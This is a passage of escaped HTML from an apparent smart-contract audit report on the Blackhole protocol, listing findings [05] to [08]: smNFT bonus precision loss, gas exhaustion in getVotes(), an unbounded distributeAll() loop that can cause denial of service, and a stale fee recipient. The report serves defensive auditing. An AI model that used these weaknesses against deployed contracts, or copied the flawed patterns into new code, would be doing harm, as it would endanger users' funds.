address:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZERO_ADDR\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft\" style=\"position:relative;\"\u003e\u003ca href=\"#05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft\" aria-label=\"05 precision loss in smnft bonus calculation may result in zero bonus when updating to smnft permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[05] Precision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1364\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1364\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-16\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-16\" aria-label=\"finding description 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003ecalculate_sm_nft_bonus\u003c/code\u003e function calculates a bonus amount for smNFT (Super Massive NFT) users based on a fixed bonus rate (\u003ccode\u003eSMNFT_BONUS\u003c/code\u003e) and a precision constant (\u003ccode\u003ePRECISISON\u003c/code\u003e). The formula used is:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecalculate_sm_nft_bonus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e){ \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSMNFT_BONUS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePRECISION\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSMNFT_BONUS\u003c/code\u003e = 1000 and \u003ccode\u003ePRECISISON\u003c/code\u003e = 10000\u003c/p\u003e\n\u003cp\u003eThe function gives a 10% bonus. However, when updating to a smNFT and the current locked amount in the lock is low, it can lead to the user receiving zero bonus.\u003c/p\u003e\n\u003ch3 id=\"impact-16\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-16\" aria-label=\"impact 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eWhile the logic is correct, integer division in Solidity can lead to precision loss for small amounts. In particular:\u003c/p\u003e\n\u003cp\u003eFor amount = 9, the bonus becomes \u003ccode\u003e(1000 * 9) / 10000 = 9000 / 10000 = 0\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eUsers having small amounts in their lock may receive no bonus at all.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eEnforce a minimum bonus floor.\u003c/p\u003e\n\u003ch2 id=\"06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks\" style=\"position:relative;\"\u003e\u003ca href=\"#06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks\" aria-label=\"06 getvotes wiew function becomes unusable when a user owns too many locks permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[06] \u003ccode\u003egetVotes()\u003c/code\u003e wiew function becomes unusable when a user owns too many locks\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1231\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1231\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-17\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-17\" aria-label=\"finding description 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003egetVotes()\u003c/code\u003e function in the VotingEscrow contract is responsible for computing a user’s voting power by summing the voting weights of all lock NFTs (token IDs) they held at the latest checkpoint:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecpData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echeckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingBalanceLogic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOfNFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingBalanceLogicData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis implementation assumes the number of token IDs per user remains reasonably small. However, in practice, a user can accumulate a large number of locks through creation of locks, splits, or transfers — potentially owning hundreds of NFT’s.\u003c/p\u003e\n\u003cp\u003eBecause \u003ccode\u003egetVotes()\u003c/code\u003e is a view function that loops over all token IDs and performs expensive computations for each, this view function can lead to gas exhaustion and revert.\u003c/p\u003e\n\u003ch3 id=\"impact-17\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-17\" aria-label=\"impact 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eUnusable view function, due to gas exhaustion.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThe protocol should only allow users to own a specific amount of locks.\u003c/p\u003e\n\u003ch2 id=\"07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges\" style=\"position:relative;\"\u003e\u003ca href=\"#07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges\" aria-label=\"07 distributeall function at risk of repeated failure due to unbounded loop over gauges permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[07] \u003ccode\u003edistributeAll()\u003c/code\u003e function at risk of repeated failure due to unbounded loop over gauges\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeManager.sol#L341\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeManager.sol#L341\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-18\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-18\" aria-label=\"finding description 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003edistributeAll()\u003c/code\u003e function aims to distribute emissions to all gauges by iterating over the entire list of pools and calling an internal \u003ccode\u003e_distribute\u003c/code\u003e function on each corresponding gauge. While this approach appears straightforward, it employs an unbounded for loop based on the dynamic length of the pools array. As the number of pools grows, the gas cost of executing this function increases proportionally, potentially leading to out-of-gas errors and causing the function to fail.\u003c/p\u003e\n\u003cp\u003eIn large-scale deployments, it’s common for protocols to have hundreds of gauges, each associated with multiple pools. For example, with just 500 gauges each having 5 pools, the loop would have to iterate over 2,500 pools. This poses a serious risk as the gas cost per iteration adds up quickly.\u003c/p\u003e\n\u003ch3 id=\"impact-18\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-18\" aria-label=\"impact 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eDenial of Service (DoS): As the number of pools increases, the \u003ccode\u003edistributeAll()\u003c/code\u003e function is likely to exceed the block gas limit, causing it to revert. This prevents emissions from being distributed entirely.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement a \u003ccode\u003ecanDistributeAll()\u003c/code\u003e view function that simulates the loop’s expected gas cost and compares it against a conservative gas limit threshold. This allows off-chain tools and frontend interfaces to pre-check if calling \u003ccode\u003edistributeAll()\u003c/code\u003e would likely succeed without incurring gas costs.\u003c/p\u003e\n\u003ch2 id=\"08-fee-recipient-may-remain-set-to-previous-owner\" style=\"position:relative;\"\u003e\u003ca href=\"#08-fee-recipient-may-remain-set-to-previous-owner\" aria-label=\"08 fee recipient may remain set to previous owner permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[08] Fee recipient may remain set to previous owner\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/CustomPoolDeployer.sol#L179\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/CustomPoolDeployer.sol#L179\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-19\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-19\" aria-label=\"finding description 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003esetAlgebraFeeRecipient()\u003c/code\u003e function allows the current owner to set a address to receive protocol fees. However, there is no automatic reset or update of the 